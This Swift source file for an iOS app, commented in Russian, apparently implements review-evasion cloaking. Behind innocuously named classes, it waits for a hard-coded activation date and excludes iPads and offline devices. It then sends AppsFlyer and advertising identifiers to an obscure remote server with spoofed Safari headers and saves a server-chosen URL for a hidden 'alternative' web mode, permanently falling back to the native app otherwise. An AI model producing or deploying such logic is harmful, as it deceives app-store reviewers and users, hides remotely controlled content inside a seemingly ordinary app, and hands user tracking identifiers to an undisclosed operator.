import Foundation
import Network
import UIKit
import AppsFlyerLib

// MARK: - Настройки в шапке файла
private let researchLaunchDate = "2025-11-30" // Дата активации
private let primaryServerURL = "http://zeolitefjdfdv.com/XK1FLv"
private let customUserAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
private let networkTimeout: TimeInterval = 5.0
private let connectionCheckTimeout: TimeInterval = 1.0

// MARK: - Browser Headers
private let browserHeaders: [String: String] = [
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Cache-Control": "max-age=0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1"
]

// MARK: - Storage Keys
private enum StorageKeys {
    static let savedTargetURL = "ProteinsSavedTargetURL"           // Постоянный URL
    static let savedPathId = "CrabsSavedPathId"                     // PathId для fallback
    static let hasShownAlternative = "ProteinsHasShownAlternative" // Флаг показа альт. режима
    static let validationPassed = "CrabsValidationPassed"           // Состояние валидации
    static let tempCurrentURL = "ProteinsTempCurrentURL"            // Временный URL (приоритетнее постоянного)
    static let ratingAlertShown = "CrabsRatingAlertShown"          // Флаг показа рейтингового алерта
}

/// Сервис для логики валидации и работы с сервером
final class NewExerciseService {
    static let shared = NewExerciseService()
    
    private var redirectDelegate: TraineeModRedirectDelegate?
    
    private init() {
    }
    
    // MARK: - Public Methods
    
    /// Проверка, был ли показан альтернативный режим
    func hasShownAlternativeMode() -> Bool {
        return UserDefaults.standard.bool(forKey: StorageKeys.hasShownAlternative)
    }
    
    /// Установка флага показа альтернативного режима
    func setHasShownAlternativeMode(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: StorageKeys.hasShownAlternative)
    }
    
    /// Проверка, был ли показан алерт оценки
    func hasShownRatingAlert() -> Bool {
        return UserDefaults.standard.bool(forKey: StorageKeys.ratingAlertShown)
    }
    
    /// Установка флага показа алерта оценки
    func setHasShownRatingAlert(_ value: Bool) {
        UserDefaults.standard.set(value, forKey: StorageKeys.ratingAlertShown)
    }
    
    /// Получение сохраненного URL
    func getSavedTargetURL() -> URL? {
        // Сначала проверяем временный URL
        if let tempURLString = UserDefaults.standard.string(forKey: StorageKeys.tempCurrentURL),
           let tempURL = URL(string: tempURLString) {
            return tempURL
        }
        
        if let urlString = UserDefaults.standard.string(forKey: StorageKeys.savedTargetURL),
           let url = URL(string: urlString) {
            return url
        }
        
        return nil
    }
    
    /// Сохранение финального URL
    func saveFinalURL(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: StorageKeys.savedTargetURL)
        UserDefaults.standard.set(url.absoluteString, forKey: StorageKeys.tempCurrentURL)
        print("Ссылка сохраненная: \(url.absoluteString)")
    }
    
    /// Очистка сохраненного URL
    func clearSavedURL() {
        UserDefaults.standard.removeObject(forKey: StorageKeys.savedTargetURL)
        UserDefaults.standard.removeObject(forKey: StorageKeys.tempCurrentURL)
    }
    
    /// Получение сохраненного pathId
    func getSavedPathId() -> String? {
        return UserDefaults.standard.string(forKey: StorageKeys.savedPathId)
    }
    
    /// Сохранение pathId
    func savePathId(_ pathId: String) {
        UserDefaults.standard.set(pathId, forKey: StorageKeys.savedPathId)
        print("path id сохраненный: \(pathId)")
    }
    
    /// Извлечение pathId из URL или HTML
    func extractPathId(from url: URL, htmlData: Data?) -> String? {
        // Сначала проверяем URL
        if let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
           let queryItems = components.queryItems {
            for item in queryItems {
                if item.name == "pathid", let value = item.value {
                    return value
                }
            }
        }
        
        // Затем проверяем HTML
        if let htmlData = htmlData,
           let htmlString = String(data: htmlData, encoding: .utf8) {
            let patterns = [
                "pathid[=:]([^&\\s\"']+)",
                "pathid\\s*=\\s*[\"']([^\"']+)[\"']",
                "pathid\\s*=\\s*([^&\\s]+)"
            ]
            
            for pattern in patterns {
                if let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) {
                    let range = NSRange(htmlString.startIndex..<htmlString.endIndex, in: htmlString)
                    if let match = regex.firstMatch(in: htmlString, options: [], range: range),
                       let pathIdRange = Range(match.range(at: 1), in: htmlString) {
                        let pathId = String(htmlString[pathIdRange])
                        return pathId
                    }
                }
            }
        }
        
        return nil
    }
    
    /// Проверка валидности URL
    func validateURL(_ url: URL, completion: @escaping (Bool) -> Void) {
        var request = URLRequest(url: url)
        request.httpMethod = "HEAD"
        request.timeoutInterval = 3.0
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
        
        configureRequestHeaders(&request)
        
        let task = URLSession.shared.dataTask(with: request) { _, response, error in
            if let httpResponse = response as? HTTPURLResponse {
                // Принимаем только 200-403 и 405, исключаем 404
                let isValid = (200...403).contains(httpResponse.statusCode) || httpResponse.statusCode == 405
                print("проверки: валидация URL - статус код: \(httpResponse.statusCode), валиден: \(isValid)")
                completion(isValid)
            } else {
                print("проверки: валидация URL - нет HTTP ответа")
                completion(false)
            }
        }
        task.resume()
    }
    
    /// Обработка fallback логики
    func handleFallback(completion: @escaping (URL?) -> Void) {
        guard let savedPathId = getSavedPathId() else {
            print("фол бэк логика: нет сохраненного pathId")
            completion(nil)
            return
        }
        
        clearSavedURL()
        
        // Строим fallback URL с sub1, sub2 и pathid
        let appsFlyerUID = AppsFlyerManager.shared.getAppsFlyerUID()
        let advertisingID = AppsFlyerManager.shared.getAdvertisingID()
        
        let baseLink = AppsFlyerManager.shared.getCustomLink(baseURL: primaryServerURL)
        guard let baseURL = URL(string: baseLink) else {
            completion(nil)
            return
        }
        
        var components = URLComponents(url: baseURL, resolvingAgainstBaseURL: false)
        var queryItems = components?.queryItems ?? []
        queryItems.append(URLQueryItem(name: "pathid", value: savedPathId))
        components?.queryItems = queryItems
        
        guard let fallbackURL = components?.url else {
            completion(nil)
            return
        }
        
        print("фол бэк логика: запуск с URL \(fallbackURL.absoluteString)")
        
        fetchAndExtractURL(from: fallbackURL) { finalURL in
            if let url = finalURL {
                print("фол бэк логика: успешно получен URL \(url.absoluteString)")
                self.saveFinalURL(url)
                CoordinatorObserver.shared.setSaveNextURL(true)
                completion(url)
            } else {
                print("фол бэк логика: не удалось получить URL")
                completion(nil)
            }
        }
    }
    
    /// Проверка даты
    func checkDate() -> Bool {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "yyyy-MM-dd"
        dateFormatter.timeZone = TimeZone(identifier: "UTC")
        
        guard let cutoffDate = dateFormatter.date(from: researchLaunchDate) else {
            print("проверки: неверный формат даты → провалено")
            return false
        }
        
        let now = Date()
        let isValid = now > cutoffDate
        
        if !isValid {
            print("проверки: дата до cutoff → провалено")
        }
        
        return isValid
    }
    
    /// Проверка первого запуска
    func isFirstLaunch() -> Bool {
        let hasShown = UserDefaults.standard.bool(forKey: StorageKeys.hasShownAlternative)
        let enforceNative = UserDefaults.standard.bool(forKey: "flow.enforceNative")
        return !hasShown && !enforceNative
    }
    
    /// Выполнение валидаций при первом запуске (после ATT и AppsFlyer)
    func performValidations(completion: @escaping (ValidationResult) -> Void) {
        print("проверки: начало")
        
        // 1. Проверка даты (ПЕРВАЯ проверка в валидациях)
        if !checkDate() {
            // Дата не прошла → enforceNative = true → Native App навсегда
            print("проверки: дата не прошла → провалено")
            UserDefaults.standard.set(true, forKey: "flow.enforceNative")
            completion(.failed)
            return
        }
        
        // 2. Проверка устройства
        if UIDevice.current.userInterfaceIdiom == .pad {
            print("проверки: iPad → провалено")
            UserDefaults.standard.set(true, forKey: "flow.enforceNative")
            completion(.failed)
            return
        }
        
        // 3. Проверка интернета
        let monitor = NWPathMonitor()
        let queue = DispatchQueue(label: "NetworkMonitor")
        monitor.start(queue: queue)
        
        let checkTimeout = DispatchTime.now() + connectionCheckTimeout
        
        monitor.pathUpdateHandler = { [weak self] path in
            monitor.cancel()
            
            guard let self = self else { return }
            
            if path.status != .satisfied {
                print("проверки: нет интернета → провалено")
                DispatchQueue.main.async {
                    completion(.failed)
                }
                return
            }
            
            print("проверки: интернет доступен")
            
            // 4. Запрос к серверу с AppsFlyer параметрами
            let appsFlyerUID = AppsFlyerManager.shared.getAppsFlyerUID()
            let advertisingID = AppsFlyerManager.shared.getAdvertisingID()
            
            let customLink = AppsFlyerManager.shared.getCustomLink(baseURL: primaryServerURL)
            
            guard let entryURL = URL(string: customLink) else {
                print("проверки: неверный URL сервера → провалено")
                DispatchQueue.main.async {
                    UserDefaults.standard.set(true, forKey: "flow.enforceNative")
                    completion(.failed)
                }
                return
            }
            
            self.fetchAndExtractURL(from: entryURL) { finalURL in
                DispatchQueue.main.async {
                    if let url = finalURL {
                        print("проверки: успешно, получен URL \(url.absoluteString)")
                        // Сохраняем URL для веб режима
                        self.saveFinalURL(url)
                        CoordinatorObserver.shared.setSaveNextURL(true)
                        completion(.success(url))
                    } else {
                        print("проверки: запрос к серверу провален → провалено")
                        UserDefaults.standard.set(true, forKey: "flow.enforceNative")
                        completion(.failed)
                    }
                }
            }
        }
        
        // Таймаут для проверки интернета
        queue.asyncAfter(deadline: checkTimeout) {
            if monitor.currentPath.status != .satisfied {
                monitor.cancel()
                print("проверки: таймаут проверки интернета → провалено")
                DispatchQueue.main.async {
                    completion(.failed)
                }
            }
        }
    }
    
    // MARK: - Private Methods
    
    private func configureRequestHeaders(_ request: inout URLRequest) {
        for (key, value) in browserHeaders {
            request.setValue(value, forHTTPHeaderField: key)
        }
        request.setValue(customUserAgent, forHTTPHeaderField: "User-Agent")
    }
    
    private func fetchAndExtractURL(from url: URL, completion: @escaping (URL?) -> Void) {
        print("проверки: начинаем запрос к: \(url.absoluteString)")
        redirectDelegate = TraineeModRedirectDelegate()
        redirectDelegate?.reset()
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.timeoutInterval = networkTimeout
        configureRequestHeaders(&request)
        
        let sessionConfig = URLSessionConfiguration.default
        let session = URLSession(configuration: sessionConfig, delegate: redirectDelegate, delegateQueue: nil)
        
        let task = session.dataTask(with: request) { [weak self] (data: Data?, response: URLResponse?, error: Error?) in
            guard let self = self else { return }
            
            // Извлекаем pathId если есть
            if let pathId = self.redirectDelegate?.extractedPathid {
                print("проверки: найден pathId в редиректах: \(pathId)")
                self.savePathId(pathId)
            }
            
            let finalURLFromRedirect = self.redirectDelegate?.finalURL
            if let redirectURL = finalURLFromRedirect {
                print("проверки: финальный URL из редиректов: \(redirectURL.absoluteString)")
            }
            
            if let error = error {
                if let finalURL = finalURLFromRedirect, finalURL.absoluteString != "about:blank" {
                    completion(finalURL)
                    return
                }
                
                completion(nil)
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                if let finalURL = finalURLFromRedirect {
                    print("проверки: ответ сервера - нет HTTP ответа, используем URL из редиректа: \(finalURL.absoluteString)")
                    completion(finalURL)
                } else {
                    print("проверки: ответ сервера - нет HTTP ответа и нет редиректа")
                    completion(nil)
                }
                return
            }
            
            let finalURL = finalURLFromRedirect ?? httpResponse.url ?? url
            print("проверки: ответ сервера - статус код: \(httpResponse.statusCode), финальный URL: \(finalURL.absoluteString)")
            
            // Принимаем только 200-403 и 405, исключаем 404
            if ((200...403).contains(httpResponse.statusCode) || httpResponse.statusCode == 405) {
                if finalURL.absoluteString != "about:blank" {
                    // Извлекаем pathId из финального URL
                    if let pathId = self.extractPathId(from: finalURL, htmlData: data) {
                        self.savePathId(pathId)
                    }
                    
                    // Немедленное завершение без задержки
                    completion(finalURL)
                } else {
                    print("проверки: ответ сервера - финальный URL is about:blank")
                    completion(nil)
                }
            } else {
                print("проверки: ответ сервера - невалидный статус код: \(httpResponse.statusCode) → провалено")
                completion(nil)
            }
        }
        task.resume()
    }
}

// MARK: - Validation Result
enum ValidationResult {
    case success(URL)
    case failed
}

// MARK: - Redirect Delegate
class TraineeModRedirectDelegate: NSObject, URLSessionTaskDelegate {
    var finalURL: URL?
    var extractedPathid: String?
    var redirectCount = 0
    
    func reset() {
        finalURL = nil
        extractedPathid = nil
        redirectCount = 0
    }
    
    func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest request: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
        redirectCount += 1
        
        if let newURL = request.url {
            finalURL = newURL
            print("проверки: редирект #\(redirectCount) на: \(newURL.absoluteString)")
            
            if let components = URLComponents(url: newURL, resolvingAgainstBaseURL: false),
               let queryItems = components.queryItems {
                for item in queryItems {
                    if item.name == "pathid", let value = item.value {
                        extractedPathid = value
                        print("проверки: найден pathId в редиректе: \(value)")
                        break
                    }
                }
            }
        }
        
        // Немедленное выполнение редиректа без задержки
        completionHandler(request)
    }
}
